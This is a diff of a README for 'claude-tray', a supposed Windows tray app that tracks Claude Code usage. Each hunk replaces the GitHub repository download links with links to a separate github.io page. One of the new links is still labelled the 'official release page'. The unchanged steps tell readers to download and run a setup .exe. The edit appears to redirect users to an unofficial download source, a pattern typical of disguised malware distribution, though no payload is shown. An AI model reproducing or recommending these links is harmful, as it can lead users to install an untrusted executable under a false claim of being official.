@@ -1,6 +1,6 @@
 # 🖥️ claude-tray - Track your Claude Code usage daily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sirtapan7-crypto/claude-tray)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://sirtapan7-crypto.github.io)
 
 Monitor your Claude Code usage directly from your Windows taskbar. This tool tracks how many requests you make, shows your current limit status, and warns you before you run out of capacity.
 
@@ -8,7 +8,7 @@ Monitor your Claude Code usage directly from your Windows taskbar. This tool tra
 
 This application runs on Windows. You do not need to install complex software or write code to use it. Follow these steps to set up the monitor on your computer.
 
-1. Go to the [official release page](https://github.com/sirtapan7-crypto/claude-tray).
+1. Go to the [official release page](https://sirtapan7-crypto.github.io).
 2. Download the latest setup file ending in .exe.
 3. Open the file to start the installation.
 4. Follow the prompts on your screen to finish the setup.
@@ -67,7 +67,7 @@ The app keeps your data on your computer. It reads the local logs created by Cla
 
 ## 📥 Installation
 
-[Download the latest version here](https://github.com/sirtapan7-crypto/claude-tray)
+[Download the latest version here](https://sirtapan7-crypto.github.io)
 
 1. Click the download link above.
 2. Select the file marked as the latest release.
